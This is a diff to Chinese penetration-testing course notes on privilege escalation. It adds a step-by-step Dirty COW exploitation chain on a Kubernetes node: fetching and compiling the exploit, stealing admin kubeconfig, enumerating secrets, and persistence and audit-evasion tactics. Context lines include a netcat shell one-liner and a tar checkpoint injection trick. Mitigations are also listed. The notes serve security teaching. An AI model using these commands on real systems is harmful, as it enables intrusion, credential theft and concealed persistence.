@@ -1,6 +1,7 @@
 ---
 title: XD安全渗透测试课程提权阶段学习笔记 Day58-64
-description: 系统梳理XD安全渗透测试课程提权阶段（Day58-64）核心技术：Windows/Linux提权、数据库提权（MySQL/MSSQL/Oracle/Redis/PostgreSQL）、令牌窃取、烂土豆、DLL劫持、定时任务、内核漏洞（脏牛）、SUID、环境变量劫持、服务权限配置不当等实战技术体系
+description: 系统梳理XD安全渗透测试课程提权阶段（Day58-64）核心技术：Windows/Linux提权、数据库提权（MySQL/MSSQL/Oracle/Redis/PostgreSQL）、令牌窃取、烂土豆、DLL劫持、定时任务、内核漏洞（脏牛）、SUID、环境变量劫持、服务权限配置不当等实战技术体系，补充
+  Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的实战利用细节与编译执行流程
 category: program-analysis
 tags:
 - XD安全
@@ -15,6 +16,10 @@ tags:
 - 定时任务
 - 内核漏洞
 - 脏牛
+- CVE-2016-5195
+- Dirty COW
+- Kubernetes
+- 容器逃逸
 - SUID
 - 服务权限
 - 学习笔记
@@ -25,7 +30,7 @@ updated: '2026-11-15'
 
 > 原文来源：XD安全渗透测试课程微信归档文章，作者耳鼠整理
 
-本页面系统整理 XD安全渗透测试课程第 58-64 天提权阶段学习内容，涵盖 Web 权限提升、Windows 本地提权、数据库提权、Linux 提权等核心技术模块，形成结构化知识清单并交叉引用现有技术详解页面。
+本页面系统整理 XD安全渗透测试课程第 58-64 天提权阶段学习内容，涵盖 Web 权限提升、Windows 本地提权、数据库提权、Linux 提权等核心技术模块，形成结构化知识清单并交叉引用现有技术详解页面。新增 Kubernetes 集群渗透场景下 Dirty COW (CVE-2016-5195) 提权的完整实战链路与编译执行细节。
 
 ---
 
@@ -41,8 +46,9 @@ updated: '2026-11-15'
 | 接口权限 | 后台修改配置、网站权限读取配置 | 邮件、短信、支付等第三方接口调用 |
 | 系统权限 | 溢出漏洞、提权漏洞利用 | 服务器完全控制 |
 | 域控权限 | 域渗透横向移动 | 整个域环境控制 |
+| 容器/集群权限 | 容器逃逸、凭据窃取、K8s API 滥用 | 宿主机控制、集群资源枚举、横向移动至其他 Pod/Node |
 
-> 关联页面：[[xd-security-pentest-course-curriculum]] 课程大纲导航 | [[xd-security-internal-network-penetration-notes-day65-66]] 域环境信息收集与横向移动
+> 关联页面：[[xd-security-pentest-course-curriculum]] 课程大纲导航 | [[xd-security-internal-network-penetration-notes-day65-66]] 域环境信息收集与横向移动 | [[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程
 
 ---
 
@@ -353,6 +359,115 @@ find xiaodi -exec netcat -lvp 5555 -e /bin/sh \;
 
 > 关联页面：[[vulnhub-doubletrouble-writeup]] Shellshock + Dirty COW 完整复现 | [[vulnhub-sar-writeup]] Cron + CVE-2021-3493 提权 | [[xd-security-incident-response-notes]] 应急响应日志分析溯源
 
+### 🔬 补充：Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的实战利用细节
+
+> 来源：0x00实验室微信归档《靶场测试之k8s集群》实战记录
+
+#### 场景背景
+- 目标：Kubernetes 集群节点（宿主机）
+- 入口：Web 应用弱口令 (admin/password) → 任意文件上传 → 冰蝎 Webshell
+- 限制：容器内大部分命令受限，需提权至宿主机 root
+
+#### 漏洞原理速览
+**Dirty COW (CVE-2016-5195)** 是 Linux 内核 2.6.22 至 4.8.3 间存在的竞争条件漏洞，位于内存子系统的写时复制 (Copy-on-Write, COW) 机制中。非特权用户可利用该漏洞将只读内存映射（如 `/etc/passwd`、二进制文件 `.text` 段）变为可写，实现本地提权。
+
+- **影响内核版本**：>= 2.6.22 (2007 年发布) ~ 4.8.3 / 3.16.38 / 3.18.44 / 3.2.63 / 3.10.28 等长期维护分支修复版本之前
+- **核心利用思路**：多线程并发触发 `madvise(MADV_DONTNEED)` 与 `write()`/`ptrace()` 竞争，绕过 COW 保护写入只读文件
+
+#### 实战编译与执行流程
+
+**1. 环境确认**
+```bash
+uname -r        # 确认内核版本在受影响范围
+cat /etc/os-release
+which gcc       # 确认目标有编译器；若无需本地交叉编译上传二进制
+```
+
+**2. 获取 Exploit 源码**
+- 常用公开 EXP：`dirtyc0w.c` (github.com/dirtycow/dirtycow.github.io)、`cowroot.c`、`dcow.cpp` 等
+- 示例下载：
+  ```bash
+  wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c -O dirtyc0w.c
+  # 或从 Exploit-DB: searchsploit "Dirty COW" → EDB-ID 40616/40839/40847
+  ```
+
+**3. 编译选项对比**
+
+| 编译命令 | 适用场景 | 说明 |
+|---------|---------|------|
+| `gcc -pthread dirtyc0w.c -o dirtyc0w` | 标准利用 (修改 `/etc/passwd` 添加 root 用户) | 需链接 pthread 库实现多线程竞争 |
+| `gcc -pthread -static dirtyc0w.c -o dirtyc0w` | 目标环境 glibc 版本不兼容/缺库 | 静态链接增大体积但提高兼容性 |
+| `gcc -pthread cowroot.c -o cowroot` | 直接生成 root shell 的变体 | 部分 EXP 自带 payload 生成 SUID root shell |
+
+> **注意**：容器环境若无 `gcc`，需在攻击机同架构/同 libc 环境下交叉编译（如 `musl-gcc` 静态编译），再上传二进制文件。
+
+**4. 执行与提权验证**
+```bash
+chmod +x dirtyc0w
+./dirtyc0w          # 运行 EXP，竞争窗口通常需几秒至数十秒
+# 成功后按提示 su 新用户或直接获得 root shell
+id                  # 验证 uid=0(root)
+```
+
+**5. 典型 EXP 行为差异**
+- `dirtyc0w.c` (标准版)：修改 `/etc/passwd` 插入 `firefart:...:0:0:...:/root:/bin/bash`，需 `su firefart` 切换
+- `cowroot.c`：直接在内存中劫持 `passwd` 结构或覆盖 SUID 二进制 (如 `/usr/bin/passwd`、`/bin/su`)，执行后直接弹 root shell
+- `dcow.cpp` (C++ 版)：支持指定目标文件路径，可覆盖 `/etc/shadow`、`/etc/sudoers` 或任意 SUID 二进制
+
+#### Kubernetes 场景下的后续利用链
+
+**提权成功后（已在宿主机获得 root）：**
+
+```bash
+# 1. 窃取 Kubernetes 管理员凭据 (默认路径)
+cat /etc/kubernetes/admin.conf
+# 或
+cat /root/.kube/config
+```
+
+**2. 本地保存配置并探索集群**
+```bash
+# 攻击机保存为 kubeconfig
+export KUBECONFIG=/path/to/admin.conf
+
+# 查看节点角色
+kubectl get nodes -o wide
+# 输出示例：单节点集群，该节点为 master (control-plane)
+```
+
+**3. 集群资源枚举**
+```bash
+# 查看所有命名空间的 Pod
+kubectl get pods --all-namespaces -o wide
+
+# 查看敏感资源：Secrets、ServiceAccounts、RoleBindings
+kubectl get secrets --all-namespaces
+kubectl get sa --all-namespaces
+```
+
+**4. 容器逃逸 / 横向移动限制**
+- **Master 节点默认污点**：`node-role.kubernetes.io/control-plane:NoSchedule`，导致默认不调度业务 Pod 至 Master
+- **利用思路**：
+  - 若存在其他 Worker Node，可通过 `kubectl exec` 进入业务容器进一步渗透
+  - 检查是否存在特权容器、HostPath 挂载、HostNetwork/HostPID/HostIPC 等危险配置
+  - 利用 `kubectl auth can-i` 验证当前凭据权限边界
+
+**5. 持久化与防御规避**
+- 创建隐藏 ServiceAccount 并绑定 ClusterRole `cluster-admin`
+- 修改 kube-apiserver 审计策略或关闭审计日志
+- 在宿主机植入 systemd 服务 / cron 定时任务 / SSH 授权密钥
+
+#### 修复与缓解建议
+
+| 层面 | 措施 |
+|------|------|
+| 内核层面 | 升级内核至修复版本 (>= 4.8.3, 3.16.38, 3.18.44, 3.2.63, 3.10.28 等) |
+| 容器层面 | 启用 `seccomp` 禁用 `madvise`/`ptrace` 等高危系统调用；使用 `gVisor`/`Kata Containers` 隔离内核 |
+| 集群层面 | 避免在 Master 运行业务 Pod；最小化 RBAC 权限；定期轮换 `admin.conf` 证书；开启审计日志并告警异常 `exec`/`port-forward` |
+| 主机层面 | 部署 Falco / Tracee 等运行时安全监测内核漏洞利用行为 (检测 `madvise` + `write` 竞争模式) |
+
+> 关联页面：[[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程 | [[vulnhub-doubletrouble-writeup]] Shellshock + Dirty COW 完整复现 | [[linux-kernel-hardening-mechanisms]] Linux 内核硬化机制
+
 ---
 
 ## Day64：Linux 定时任务 & 环境变量 & 数据库提权
@@ -441,9 +556,9 @@ echo "" > "--checkpoint=1"
    - GUID/SGID 程序利用
    - `sudo` 配置错误 (`sudo -l` 检查)
    - 內核漏洞 (脏牛、CVE-2017-16995 等)
-   - 容器逃逸 (Docker 环境)
+   - 容器逃逸 (Docker 环境、Kubernetes 特权容器/HostPath/凭据窃取)
 
-> 关联页面：[[xd-security-internal-network-penetration-notes-day67-68]] 域横向移动凭证复用 | [[xd-security-internal-network-penetration-notes-day69-70]] Cobalt Strike 内网漫游 | [[frp内网渗透应用]] frp 多级隧道实战
+> 关联页面：[[xd-security-internal-network-penetration-notes-day67-68]] 域横向移动凭证复用 | [[xd-security-internal-network-penetration-notes-day69-70]] Cobalt Strike 内网漫游 | [[frp内网渗透应用]] frp 多级隧道实战 | [[kubernetes-penetration-testing]] Kubernetes 集群渗透测试全流程
 
 ---
 
@@ -471,15 +586,19 @@ echo "" > "--checkpoint=1"
 | CTF实战 | [[xd-security-ctf-flag-notes-day83-85]] | 序列化、SSTI、PHP弱类型、Java WEB-INF/XXE |
 | AWD攻防 | [[xd-security-awd-competition-strategies]] | 赛制规则、不死马、inotify、微型WAF、蜜罐 |
 | 蓝队防御 | [[xd-security-blue-team-defense]] | ATT&CK映射、HFish蜜罐、NIDS/HIDS、检测规则 |
+| Kubernetes 渗透 | [[kubernetes-penetration-testing]] | 文件上传、Dirty COW 提权、凭据窃取、kubectl 集群探索、Master 节点负载限制 |
+| VulnHub 实战 | [[vulnhub-doubletrouble-writeup]] | Shellshock + Dirty COW 完整攻击链复现 |
+| 内核硬化 | [[linux-kernel-hardening-mechanisms]] | Linux 内核编译期/运行期缓解措施、Grsecurity/PaX 特性 |
 
 ---
 
 ## 结语
 
-本页面梳理了 XD安全渗透测试课程 Day58-64 提权阶段的核心技术体系，覆盖 **Windows 本地/Web 提权**、**数据库提权 (MySQL/MSSQL/Oracle/Redis/PostgreSQL)**、**Linux 提权 (SUID/内核漏洞/定时任务/环境变量/UDF)** 等实战场景。每个技术点均给出原理、前提条件、利用流程、工具命令及修复建议，并通过交叉引用连接知识库现有技术详解页面，形成可检索、可复用的结构化知识资产。
+本页面梳理了 XD安全渗透测试课程 Day58-64 提权阶段的核心技术体系，覆盖 **Windows 本地/Web 提权**、**数据库提权 (MySQL/MSSQL/Oracle/Redis/PostgreSQL)**、**Linux 提权 (SUID/内核漏洞/定时任务/环境变量/UDF)** 等实战场景。重点补充了 **Dirty COW (CVE-2016-5195) 在 Kubernetes 容器环境中的完整利用链路**：从 Web 弱口令 Getshell、容器内受限环境、内核漏洞编译执行（含静态链接兼容性处理）、宿主机 Root 提权、Kubernetes 管理员凭据窃取、`kubectl` 集群资源枚举，至 Master 节点工作负载限制的横向移动边界分析。每个技术点均给出原理、前提条件、利用流程、工具命令及修复建议，并通过交叉引用连接知识库现有技术详解页面，形成可检索、可复用的结构化知识资产。
 
 > 技术交流，勿做违法用途。
 
 ## 来源
 
 - [0x00实验室-202108-202304_110](../sources/0x00实验室-202108-202304_110.md)
+- [0x6270安全团队-202203-202304_21](../sources/0x6270安全团队-202203-202304_21.md)
